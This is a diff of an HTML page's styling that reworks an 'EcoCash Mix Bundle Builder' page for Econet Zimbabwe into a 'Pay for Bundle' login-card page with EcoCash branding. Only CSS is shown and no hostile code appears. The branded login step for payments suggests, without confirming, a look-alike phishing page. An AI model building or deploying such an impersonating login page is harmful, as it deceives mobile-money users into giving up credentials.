@@ -1,780 +1,636 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
-<title>EcoCash | Mix Bundle Builder · Econet Zimbabwe</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
-<style>
-:root{
-  --blue:       #0033a0;
-  --blue-dark:  #002280;
-  --blue-deep:  #001860;
-  --blue-light: #1a4dbf;
-  --blue-soft:  rgba(0,51,160,0.10);
-  --blue-bdr:   rgba(0,51,160,0.25);
-  --green:      #00b050;
-  --green-dark: #007d38;
-  --green-soft: rgba(0,176,80,0.12);
-  --gold:       #f59e0b;
-  --page:       #06112a;
-  --surface:    #0c1e3f;
-  --surface2:   #112350;
-  --border:     rgba(255,255,255,0.10);
-  --border2:    rgba(255,255,255,0.20);
-  --text:       #ffffff;
-  --text2:      #c8d8f0;
-  --muted:      #7a99c8;
-  --shadow:     0 4px 24px rgba(0,0,0,0.35);
-  --shadow-b:   0 8px 40px rgba(0,51,160,0.40);
-  --header-h:   72px;
-  --tr:         0.22s ease;
-}
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html{scroll-behavior:smooth}
-@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}}
-body{font-family:'Inter',sans-serif;background:var(--page);color:var(--text);line-height:1.6;overflow-x:hidden;-webkit-font-smoothing:antialiased}
-body.splash-lock{overflow:hidden;height:100vh}
-img,svg{max-width:100%}
-:focus-visible{outline:2px solid var(--green);outline-offset:2px}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>EcoCash | Pay for Bundle · Econet Zimbabwe</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 
-.page-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
-.page-bg::before{content:'';position:absolute;top:-200px;right:-200px;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(0,51,160,0.18) 0%,transparent 70%)}
-.page-bg::after{content:'';position:absolute;bottom:-100px;left:-150px;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(0,176,80,0.08) 0%,transparent 70%)}
+    :root {
+      --blue: #0B5ED7;
+      --blue-dark: #073B8E;
+      --blue-soft: #EDF6FF;
+      --blue-light: #F7FBFF;
+      --blue-border: #CFE6FF;
+      --green: #00b050;
+      --red: #E42320;
+      --text: #0f172a;
+      --muted: #64748b;
+      --white: #ffffff;
+      --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
+    }
 
-.splash{position:fixed;inset:0;z-index:3000;background:radial-gradient(circle at 50% 30%,var(--blue-deep) 0%,var(--page) 75%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;transition:opacity .45s ease,visibility .45s ease}
-.splash.hide{opacity:0;visibility:hidden;pointer-events:none}
-.splash-logos{display:flex;align-items:center;gap:16px}
-.splash-logo{display:flex;align-items:center;gap:8px;padding:10px 18px;border-radius:12px;font-weight:800;font-size:1.05rem;letter-spacing:-.3px}
-.splash-logo.econet{background:var(--blue);color:#fff}
-.splash-logo.econet::before{content:'●';color:var(--green);margin-right:2px}
-.splash-logo.ecocash{background:var(--green);color:#012}
-.splash-plus{color:var(--muted);font-size:1.2rem;font-weight:300}
-.splash-spinner{width:34px;height:34px;border-radius:50%;border:3px solid var(--border2);border-top-color:var(--green);animation:spin .8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.splash p{color:var(--text2);font-size:13px;font-weight:600;letter-spacing:.3px}
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { -webkit-text-size-adjust: 100%; }
 
-.ticker-wrap{background:#000c23;color:var(--text2);padding:11px 0;overflow:hidden;white-space:nowrap;border-bottom:2px solid var(--green)}
-.ticker-inner{display:inline-flex;animation:ticker 40s linear infinite}
-.ticker-inner span{margin-right:70px;font-size:12.5px;display:inline-flex;align-items:center;gap:8px;font-weight:600}
-@keyframes ticker{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+    body {
+      min-height: 100dvh;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 12% 8%, rgba(11, 94, 215, 0.20), transparent 30%),
+        radial-gradient(circle at 88% 88%, rgba(7, 59, 142, 0.16), transparent 32%),
+        linear-gradient(180deg, #f8fbff 0%, #eef6ff 100%);
+      overflow-x: hidden;
+    }
 
-header{background:rgba(6,17,42,0.97);backdrop-filter:blur(12px);border-bottom:2px solid rgba(0,51,160,0.4);position:sticky;top:0;z-index:1000;box-shadow:0 4px 24px rgba(0,0,0,.5);padding-top:env(safe-area-inset-top)}
-.nav-content{max-width:1400px;margin:0 auto;padding:0 5%;height:var(--header-h);display:flex;align-items:center;justify-content:space-between;gap:14px}
-.logo{display:flex;align-items:center;gap:12px;text-decoration:none;flex-shrink:0;min-width:0}
-.logo-icon{width:44px;height:44px;background:linear-gradient(135deg,var(--blue),var(--blue-light));border-radius:12px;display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow-b);flex-shrink:0}
-.logo-icon span{color:white;font-weight:900;font-size:18px;letter-spacing:-1px}
-.logo-name{font-size:1.5rem;font-weight:900;color:var(--text);letter-spacing:-.5px;line-height:1;white-space:nowrap}
-.logo-name em{color:var(--green);font-style:normal}
-.logo-sub{font-size:9px;color:var(--muted);font-weight:700;letter-spacing:2px;text-transform:uppercase;display:block;margin-top:2px;white-space:nowrap}
-.live-pill{background:rgba(0,176,80,0.15);border:1px solid rgba(0,176,80,0.35);color:var(--green);font-size:10.5px;font-weight:700;letter-spacing:1px;padding:5px 13px;border-radius:20px;display:flex;align-items:center;gap:6px;flex-shrink:0}
-.live-dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 1.4s infinite}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-.nav-links{display:flex;gap:24px;font-weight:600;font-size:14px}
-.nav-links a{color:var(--text2);text-decoration:none;transition:var(--tr);padding:6px 0;border-bottom:2px solid transparent}
-.nav-links a:hover{color:var(--text);border-bottom-color:var(--blue-light)}
-.login-btn{background:linear-gradient(135deg,var(--blue),var(--blue-light));color:white;padding:10px 26px;border-radius:50px;font-weight:700;text-decoration:none;transition:var(--tr);font-size:13px;box-shadow:var(--shadow-b);flex-shrink:0}
-.login-btn:hover{transform:scale(1.04)}
-.hamburger{display:none;font-size:1.8rem;color:var(--text);cursor:pointer;background:none;border:none;padding:2px;flex-shrink:0}
+    .topbar {
+      height: 64px;
+      padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
+      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+      color: var(--white);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 10px 28px rgba(11, 94, 215, 0.18);
+    }
 
-.hero{background:linear-gradient(160deg,var(--blue-deep) 0%,var(--blue) 55%,#004d80 100%);color:white;padding:clamp(64px,13vw,140px) 5% clamp(56px,10vw,100px);text-align:center;position:relative;overflow:hidden;z-index:1}
-.hero::before{content:'';position:absolute;inset:0;background-image:radial-gradient(circle at 70% 30%,rgba(0,176,80,0.12) 0%,transparent 55%);pointer-events:none}
-.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,176,80,0.18);border:1px solid rgba(0,176,80,0.40);color:var(--green);font-size:11px;font-weight:700;padding:7px 18px;letter-spacing:2px;text-transform:uppercase;border-radius:999px;margin-bottom:22px}
-.hero h1{font-size:clamp(2.1rem,7.5vw,4.2rem);font-weight:900;margin-bottom:16px;letter-spacing:-1.5px;line-height:1.08}
-.hero h1 em{font-style:normal;color:var(--green)}
-.hero p{font-size:clamp(.95rem,2.4vw,1.15rem);max-width:640px;margin:0 auto 36px;color:rgba(255,255,255,.8);line-height:1.75;padding:0 6px}
-.hero-cta{display:inline-block;background:linear-gradient(135deg,var(--green),var(--green-dark));color:white;padding:17px 56px;border-radius:50px;font-weight:800;text-decoration:none;font-size:1.05rem;letter-spacing:.3px;box-shadow:0 8px 32px rgba(0,176,80,.45);transition:var(--tr)}
-.hero-cta:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,176,80,.5)}
-.hero-stats{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-top:28px}
-.hstat{background:rgba(255,255,255,.10);border:1px solid rgba(255,255,255,.20);border-radius:999px;padding:7px 16px;font-size:12px;font-weight:700;color:white;white-space:nowrap}
+    .brand {
+      font-size: clamp(21px, 5vw, 25px);
+      font-weight: 800;
+      letter-spacing: -0.8px;
+      text-decoration: none;
+      line-height: 1;
+    }
 
-.section{padding:clamp(56px,9vw,90px) 5%;position:relative;z-index:1}
-.section-label{color:var(--green);font-weight:700;text-align:center;letter-spacing:3px;font-size:.9rem;text-transform:uppercase;display:block;margin-bottom:12px}
-.section-title{text-align:center;font-size:clamp(1.7rem,5.5vw,2.7rem);font-weight:900;margin-bottom:16px;letter-spacing:-.8px;color:var(--text)}
-.section-sub{text-align:center;max-width:800px;margin:0 auto 50px;color:var(--muted);font-size:1rem;line-height:1.75;padding:0 6px}
+    .brand .eco { color: #ffffff; }
+    .brand .cash { color: #ff3b30; }
+    .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
 
-.summary-card{max-width:720px;margin:0 auto 28px;background:var(--surface);border:1px solid var(--border2);border-radius:18px;padding:16px 22px;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap;box-shadow:var(--shadow)}
-.summary-left{display:flex;align-items:center;gap:12px;min-width:0}
-.summary-period{font-size:11px;font-weight:800;color:var(--green);letter-spacing:1px;text-transform:uppercase}
-.summary-price-label{font-size:11px;color:var(--muted);font-weight:600}
-.summary-price{font-size:1.5rem;font-weight:900;color:var(--text);letter-spacing:-.5px;line-height:1;margin-top:2px}
-.summary-metrics{display:flex;gap:18px;flex-wrap:wrap}
-.summary-metric{text-align:center;min-width:52px}
-.summary-metric .sm-label{font-size:10px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
-.summary-metric .sm-val{font-size:1rem;font-weight:800;color:var(--text);margin-top:2px}
+    main {
+      min-height: calc(100dvh - 64px);
+      padding: clamp(14px, 3vw, 28px) max(12px, env(safe-area-inset-right)) max(14px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
+      display: grid;
+      place-items: center;
+    }
 
-.period-tabs-wrap{margin-bottom:40px;max-width:760px;margin-left:auto;margin-right:auto}
-.period-tabs{display:flex;justify-content:center;gap:8px;flex-wrap:wrap}
-.ptab{padding:10px 22px;border-radius:50px;font-weight:700;font-size:13px;cursor:pointer;border:2px solid var(--border2);background:transparent;color:var(--muted);font-family:'Inter',sans-serif;transition:all var(--tr);letter-spacing:.3px;white-space:nowrap;text-decoration:none}
-.ptab:hover{border-color:var(--blue-light);color:var(--text)}
-.ptab.active{background:linear-gradient(135deg,var(--blue),var(--blue-light));border-color:transparent;color:white;box-shadow:var(--shadow-b)}
-.ptab .ptab-price{font-size:10px;display:block;font-weight:600;margin-top:2px;opacity:.85}
+    .login-card {
+      width: min(100%, 500px);
+      background: rgba(255, 255, 255, 0.98);
+      border: 1px solid rgba(219, 234, 254, 0.95);
+      border-radius: clamp(18px, 5vw, 28px);
+      padding: clamp(22px, 5vw, 36px);
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+    }
 
-.bundles-stack{display:flex;flex-direction:column;gap:32px;max-width:760px;margin:0 auto}
-.bundle-card-main{background:var(--surface);border-radius:24px;border:1px solid var(--border2);overflow:hidden;box-shadow:0 16px 60px rgba(0,0,0,.4);scroll-margin-top:90px}
-.bcard-head{background:linear-gradient(135deg,var(--blue),var(--blue-light));padding:24px 28px;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap}
-.bcard-head-left{min-width:0}
-.bcard-head-left h2{font-size:1.5rem;font-weight:900;color:white;margin:0}
-.bcard-head-left p{font-size:12px;color:rgba(255,255,255,.75);margin-top:3px;font-weight:500}
-.bcard-price-wrap{text-align:right}
-.bcard-price-label{font-size:10px;color:rgba(255,255,255,.65);font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}
-.bcard-price{font-size:2.6rem;font-weight:900;color:white;letter-spacing:-1px;line-height:1}
-.bcard-price span{font-size:1rem;vertical-align:super;font-weight:700;margin-right:2px}
-.best-badge{display:inline-block;background:var(--gold);color:#000;font-size:10px;font-weight:800;padding:3px 10px;border-radius:999px;margin-top:6px;letter-spacing:.5px}
-.bcard-body{padding:28px}
-.slider-section{margin-bottom:28px}
-.slider-section:last-child{margin-bottom:0}
-.slider-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;gap:10px}
-.slider-icon{width:36px;height:36px;background:var(--surface2);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
-.slider-info{flex:1;margin:0 14px;min-width:0}
-.slider-info h4{font-size:14px;font-weight:700;color:var(--text);margin-bottom:1px}
-.slider-info p{font-size:11px;color:var(--muted);font-weight:500}
-.slider-val{font-size:1.3rem;font-weight:900;color:var(--text);min-width:72px;text-align:right;letter-spacing:-.5px;flex-shrink:0}
-.slider-val em{font-size:11px;font-weight:600;color:var(--muted);font-style:normal;margin-left:2px}
-input[type=range]{width:100%;-webkit-appearance:none;appearance:none;height:26px;background:transparent;outline:none;cursor:pointer;margin-top:4px}
-input[type=range]::-webkit-slider-runnable-track{height:8px;border-radius:4px;background:linear-gradient(to right,var(--green) 0%,var(--green) var(--pct,100%),var(--surface2) var(--pct,100%),var(--surface2) 100%)}
-input[type=range]::-moz-range-track{height:8px;border-radius:4px;background:linear-gradient(to right,var(--green) 0%,var(--green) var(--pct,100%),var(--surface2) var(--pct,100%),var(--surface2) 100%)}
-input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:26px;height:26px;border-radius:50%;background:#fff;border:3px solid var(--green);box-shadow:0 2px 10px rgba(0,176,80,.45);cursor:grab;margin-top:-9px}
-input[type=range]::-moz-range-thumb{width:26px;height:26px;border-radius:50%;background:#fff;border:3px solid var(--green);box-shadow:0 2px 10px rgba(0,176,80,.45);cursor:grab}
-input[type=range]:active::-webkit-slider-thumb{cursor:grabbing;transform:scale(1.1)}
-.range-minmax{display:flex;justify-content:space-between;font-size:10.5px;color:var(--muted);font-weight:600;margin-top:2px}
-.price-bar{background:var(--surface2);border-top:1px solid var(--border2);padding:20px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
-.price-bar-label{font-size:11px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
-.price-bar-val{font-size:2rem;font-weight:900;color:white;letter-spacing:-.8px}
-.price-bar-sub{font-size:11px;color:var(--muted);margin-top:3px}
-.subscribe-btn{background:linear-gradient(135deg,var(--green),var(--green-dark));color:white;border:none;padding:15px 36px;border-radius:50px;font-weight:800;font-size:1rem;cursor:pointer;font-family:'Inter',sans-serif;transition:var(--tr);letter-spacing:.3px;box-shadow:0 4px 18px rgba(0,176,80,.4);min-height:48px}
-.subscribe-btn:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,176,80,.5)}
-.security-row{display:flex;align-items:center;justify-content:center;gap:16px;padding:14px 28px;background:rgba(0,0,0,.2);border-top:1px solid var(--border);flex-wrap:wrap}
-.sec-badge{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--muted);font-weight:600}
-.sec-dot{width:4px;height:4px;background:var(--blue-light);border-radius:50%;flex-shrink:0}
+    .login-card::before {
+      content: "";
+      position: absolute;
+      inset: 0 0 auto 0;
+      height: 8px;
+      background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+    }
 
-.stats-strip{background:linear-gradient(135deg,var(--blue-deep),var(--blue));padding:0;position:relative;z-index:1}
-.stats-grid{max-width:1400px;margin:0 auto;padding:0 5%;display:grid;grid-template-columns:repeat(4,1fr)}
-.stat-item{padding:28px 16px;text-align:center;border-right:1px solid rgba(255,255,255,.12)}
-.stat-item:last-child{border-right:none}
-.stat-val{font-size:clamp(1.6rem,5vw,2.4rem);font-weight:900;color:white;letter-spacing:-1px;line-height:1}
-.stat-val.green{color:var(--green)}
-.stat-label{font-size:11px;color:rgba(255,255,255,.6);font-weight:600;margin-top:6px;letter-spacing:.5px;text-transform:uppercase}
+    .logo-lockup {
+      text-align: center;
+      margin: 8px 0 22px;
+    }
 
-.benefits-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px;max-width:1200px;margin:0 auto}
-.benefit-card{background:var(--surface);padding:28px 22px;border-radius:18px;border:1px solid var(--border);transition:all var(--tr)}
-.benefit-card:hover{border-color:var(--blue-light);transform:translateY(-4px);box-shadow:var(--shadow)}
-.benefit-icon{width:50px;height:50px;background:linear-gradient(135deg,var(--blue-soft),rgba(0,176,80,.1));border:1px solid var(--blue-bdr);border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:1.5rem;margin-bottom:16px}
-.benefit-card h3{font-size:1rem;font-weight:800;color:var(--text);margin-bottom:7px}
-.benefit-card p{font-size:13px;color:var(--muted);line-height:1.65}
+    .logo-text {
+      font-size: clamp(34px, 9vw, 46px);
+      font-weight: 800;
+      letter-spacing: -1.6px;
+      line-height: 1;
+    }
 
-.steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;max-width:1100px;margin:0 auto}
-.step-card{background:var(--surface);padding:28px 22px;border-radius:18px;border:1px solid var(--border);text-align:center;transition:all var(--tr)}
-.step-card:hover{border-color:var(--blue-light);transform:translateY(-4px)}
-.step-num{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:900;color:white;margin:0 auto 16px;box-shadow:var(--shadow-b)}
-.step-card h3{font-size:1rem;font-weight:800;color:var(--text);margin-bottom:7px}
-.step-card p{font-size:13px;color:var(--muted);line-height:1.65}
-.step-icon-badge{font-size:1.4rem;display:block;margin-bottom:6px}
-@media(min-width:900px){.steps-grid{grid-template-columns:repeat(5,1fr)}}
+    .logo-eco { color: var(--blue); }
+    .logo-cash { color: var(--red); }
 
-.testimonials-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px;max-width:1200px;margin:0 auto}
-.testimonial-card{background:var(--surface);padding:24px 20px;border-radius:16px;border:1px solid var(--border);transition:all var(--tr)}
-.testimonial-card:hover{transform:translateY(-5px);border-color:var(--blue-light);box-shadow:var(--shadow)}
-.t-stars{color:var(--gold);font-size:13px;letter-spacing:2px;margin-bottom:10px}
-.t-text{font-size:13px;color:var(--text2);line-height:1.75;font-style:italic;margin-bottom:14px}
-.t-author{font-size:12px;font-weight:700;color:var(--muted)}
+    .product-name {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      padding: 8px 14px;
+      border-radius: 999px;
+      background: var(--blue-soft);
+      color: var(--blue-dark);
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
 
-.faq-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px;max-width:1000px;margin:0 auto}
-.faq-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;border-left:4px solid transparent;transition:border-color var(--tr)}
-.faq-card.open{border-left-color:var(--blue-light)}
-.faq-question{width:100%;text-align:left;background:none;border:none;font-size:13.5px;font-weight:700;padding:17px 20px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;color:var(--text);font-family:'Inter',sans-serif;gap:12px}
-.faq-icon{width:26px;height:26px;background:var(--surface2);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:var(--blue-light);font-size:14px;font-weight:900;transition:all var(--tr)}
-.faq-card.open .faq-icon{background:var(--blue-light);color:white;transform:rotate(45deg)}
-.faq-answer{max-height:0;overflow:hidden;transition:max-height .3s ease}
-.faq-card.open .faq-answer{max-height:200px}
-.faq-ans-text{padding:4px 20px 16px;font-size:13px;color:var(--muted);line-height:1.75}
+    h1 {
+      text-align: center;
+      font-size: clamp(22px, 6vw, 28px);
+      font-weight: 800;
+      letter-spacing: -0.9px;
+      margin-bottom: 8px;
+    }
 
-.cta-banner{background:linear-gradient(135deg,var(--blue-deep),var(--blue));padding:clamp(48px,9vw,72px) 5%;text-align:center;position:relative;z-index:1;overflow:hidden}
-.cta-banner::before{content:'';position:absolute;top:-60px;right:-60px;width:380px;height:380px;background:radial-gradient(circle,rgba(0,176,80,.15) 0%,transparent 70%)}
-.cta-banner h2{font-size:clamp(1.6rem,5.5vw,2.8rem);font-weight:900;color:white;margin-bottom:12px;letter-spacing:-.8px;position:relative;z-index:1}
-.cta-banner p{color:rgba(255,255,255,.7);font-size:1.05rem;margin-bottom:28px;position:relative;z-index:1}
+    .subtitle {
+      max-width: 390px;
+      margin: 0 auto 22px;
+      text-align: center;
+      color: var(--muted);
+      font-size: clamp(13px, 3.6vw, 14px);
+      line-height: 1.55;
+    }
 
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,8,24,.60);z-index:2000;align-items:flex-end;justify-content:center;backdrop-filter:blur(6px)}
-.modal.open{display:flex}
-.modal-box{background:#f0f4f9;width:100%;max-width:600px;border-radius:22px 22px 0 0;overflow:hidden;box-shadow:0 -8px 60px rgba(0,0,0,.35);animation:slideUp .3s cubic-bezier(.22,.8,.3,1) both;max-height:90vh;display:flex;flex-direction:column;}
-@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
-.modal-drag{display:flex;justify-content:center;padding:12px 0 6px;background:#f0f4f9;flex-shrink:0}
-.modal-drag-bar{width:44px;height:5px;background:#ccd4e0;border-radius:3px}
-.modal-head{display:flex;align-items:center;justify-content:space-between;padding:4px 22px 16px;background:#f0f4f9;flex-shrink:0;}
-.modal-head h3{font-size:1.2rem;font-weight:800;color:#0a1f4e;margin:0;letter-spacing:-.3px}
-.modal-close-btn{background:rgba(0,0,0,0.07);border:none;color:#5a6a85;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;transition:var(--tr);flex-shrink:0;font-weight:700;}
-.modal-close-btn:hover{background:rgba(0,0,0,0.14)}
-.modal-body{padding:0 16px 20px;overflow-y:auto}
-.modal-section-label{font-size:10px;font-weight:800;color:#8a9bb8;text-transform:uppercase;letter-spacing:1.5px;padding:0 6px;margin-bottom:8px;display:block;}
-.modal-rows-card{background:#fff;border-radius:16px;overflow:hidden;border:1px solid rgba(0,30,80,0.08);box-shadow:0 2px 12px rgba(0,30,80,0.06);margin-bottom:14px;}
-.modal-row{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid rgba(0,30,80,0.07);}
-.modal-row:last-child{border-bottom:none}
-.modal-row-left{display:flex;align-items:center;gap:10px;font-size:14px;font-weight:500;color:#4a5d80}
-.modal-row-dot{width:7px;height:7px;background:#bcc8de;border-radius:50%;flex-shrink:0}
-.modal-row-val{font-size:14px;font-weight:700;color:#0a1f4e;letter-spacing:-.2px}
-.modal-total-row{background:linear-gradient(135deg,#e8eef8,#dde5f5);border-radius:14px;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;border:1px solid rgba(0,51,160,0.12);}
-.modal-total-label{font-size:14px;font-weight:700;color:#2a3f6e}
-.modal-total-val{font-size:1.5rem;font-weight:900;color:#0033a0;letter-spacing:-.5px}
-.modal-btns{display:flex;gap:12px;margin-top:4px}
-.mbtn{flex:1;padding:16px;border-radius:50px;font-weight:800;cursor:pointer;font-size:14px;font-family:'Inter',sans-serif;transition:var(--tr);min-height:52px;letter-spacing:.1px}
-.mbtn-confirm{background:linear-gradient(135deg,#0033a0,#1a4dbf);color:white;border:none;box-shadow:0 4px 18px rgba(0,51,160,.35);}
-.mbtn-confirm:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,51,160,.45)}
-.mbtn-cancel{background:#fff;color:#5a6a85;border:1.5px solid #d0d9ea;}
-.mbtn-cancel:hover{border-color:#9aaac4;color:#0a1f4e}
+    /* Bundle summary card — always shown when params present */
+    .bundle-summary {
+      display: none;
+      background: linear-gradient(160deg, #001860 0%, #0033a0 100%);
+      border-radius: 18px;
+      padding: 16px 18px;
+      margin-bottom: 20px;
+      color: #fff;
+    }
 
-#authScreen{display:none;position:fixed;inset:0;z-index:3000;background:linear-gradient(160deg,#1036b8 0%,#0033a0 40%,#0040c8 100%);flex-direction:column;align-items:center;justify-content:center;gap:0;}
-#authScreen.show{display:flex}
-#authScreen::before{content:'';position:absolute;top:15%;left:50%;transform:translateX(-50%);width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,0.07) 0%,transparent 65%);pointer-events:none;}
-.auth-logo-wrap{background:white;border-radius:14px;padding:12px 22px;display:flex;align-items:center;gap:0;margin-bottom:48px;box-shadow:0 4px 24px rgba(0,0,0,.25);}
-.auth-econet{display:flex;flex-direction:column;align-items:flex-start;padding-right:18px;border-right:1.5px solid #dde;}
-.auth-econet-main{font-size:18px;font-weight:900;letter-spacing:-.5px;background:linear-gradient(90deg,#d10000 0%,#003399 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.auth-econet-sub{font-size:9px;font-weight:600;color:#666;letter-spacing:.5px;margin-top:-2px}
-.auth-ecocash{font-size:20px;font-weight:900;padding-left:18px;background:linear-gradient(90deg,#009900 0%,#00cc33 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-.3px;}
-.auth-spinner{width:46px;height:46px;border-radius:50%;border:3.5px solid rgba(255,255,255,0.20);border-top-color:rgba(255,255,255,0.85);animation:spin .9s linear infinite;margin-bottom:28px;}
-.auth-title{font-size:1.3rem;font-weight:800;color:white;letter-spacing:-.3px;margin-bottom:8px;}
-.auth-sub{font-size:13px;color:rgba(255,255,255,0.65);font-weight:500;margin-bottom:28px;}
-.auth-dots{display:flex;gap:8px;align-items:center}
-.auth-dot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.35);transition:background .3s;}
-.auth-dot.active{background:rgba(255,255,255,0.9)}
-.auth-dot.dash{width:22px;height:10px;border-radius:5px;background:rgba(255,255,255,0.9);}
+    .bundle-summary.active { display: block; }
 
-footer{background:#040d1e;padding:64px 5% 32px;color:var(--muted);position:relative;z-index:1}
-.footer-inner{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:40px}
-.footer-brand p{font-size:13px;color:var(--muted);line-height:1.75;max-width:230px}
-.footer-divider{width:32px;height:2px;background:var(--green);margin:14px 0}
-.footer-brand-logo{display:flex;align-items:center;gap:10px;text-decoration:none;margin-bottom:16px}
-.footer-col h4{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px;color:rgba(255,255,255,.3)}
-.footer-col a{display:block;font-size:13px;color:var(--muted);text-decoration:none;margin-bottom:9px;transition:color var(--tr);font-weight:500}
-.footer-col a:hover{color:white}
-.footer-bottom{max-width:1400px;margin:40px auto 0;padding-top:22px;border-top:1px solid rgba(255,255,255,.07);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
-.footer-bottom p{font-size:12px;color:rgba(255,255,255,.25)}
-.footer-badge{font-size:11px;color:rgba(255,255,255,.25);display:flex;align-items:center;gap:8px}
-.footer-badge-dot{width:5px;height:5px;background:var(--green);border-radius:50%;flex-shrink:0}
+    .bs-title {
+      font-size: 10px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: rgba(255,255,255,0.55);
+      margin-bottom: 10px;
+    }
 
-@media(max-width:1024px){.stats-grid{grid-template-columns:repeat(2,1fr)}.stat-item:nth-child(1),.stat-item:nth-child(2){border-bottom:1px solid rgba(255,255,255,.12)}.stat-item:nth-child(2){border-right:none}}
-@media(max-width:768px){.nav-links{position:fixed;top:var(--header-h);left:-100%;width:100%;height:calc(100vh - var(--header-h));background:var(--page);flex-direction:column;padding-top:40px;gap:24px;transition:.35s ease;z-index:1200;overflow-y:auto}.nav-links.active{left:0}.nav-links a{font-size:1.05rem;padding:12px 8%;border-bottom:1px solid var(--border)}.hamburger{display:block}.hero{padding-top:56px}.section{padding-top:52px;padding-bottom:52px}.bcard-head{flex-direction:column;gap:12px;text-align:center}.bcard-price-wrap{text-align:center}.price-bar{flex-direction:column;align-items:stretch;text-align:center}.subscribe-btn{width:100%}.period-tabs{flex-wrap:nowrap;overflow-x:auto;justify-content:flex-start;-webkit-overflow-scrolling:touch;scroll-snap-type:x mandatory;padding-bottom:10px;margin:0 -5%;padding-left:5%;padding-right:5%;scrollbar-width:none}.period-tabs::-webkit-scrollbar{display:none}.ptab{scroll-snap-align:start;flex-shrink:0}.summary-card{padding:14px 18px;justify-content:center;text-align:center}.summary-left{flex-direction:column;gap:2px}.summary-metrics{justify-content:center;width:100%}.steps-grid{grid-template-columns:1fr 1fr}.modal-btns{flex-direction:column-reverse}}
